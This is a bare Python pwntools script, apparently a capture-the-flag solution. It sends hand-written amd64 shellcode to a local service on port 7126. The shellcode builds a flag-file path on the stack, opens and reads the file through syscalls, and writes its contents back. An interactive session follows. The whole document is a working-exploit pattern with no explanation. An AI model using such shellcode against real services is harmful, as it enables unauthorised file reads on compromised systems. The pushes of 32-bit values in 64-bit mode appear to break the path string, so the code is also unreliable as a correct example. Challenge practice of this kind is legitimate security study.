from pwn import *
from IPython import embed

context.arch = 'amd64'

r = remote('127.0.0.1', 7126)


a = asm("""
        sub rsp, 100
        xor rcx, rcx
        xor rdx, rdx
        xor rax, rax
        xor rbx, rbx
        push rcx
        push 0x67616c66
        push 0x2f2f7772
        push 0x6f2f2f65
        push 0x6d6f682f
        mov rdi, rsp
        mov rax, 2
        syscall
        nop
        mov rdi, rax
        mov rsi, rsp
        mov rax, 0
        syscall
        nop
        mov rdi, 1
        mov rdx, 60
        mov rax, 1
        syscall
        nop
        add rsp, 120
        ret
        """)

#embed()
raw_input('@')
r.send(a)

print r.recv(60)
r.interactive()
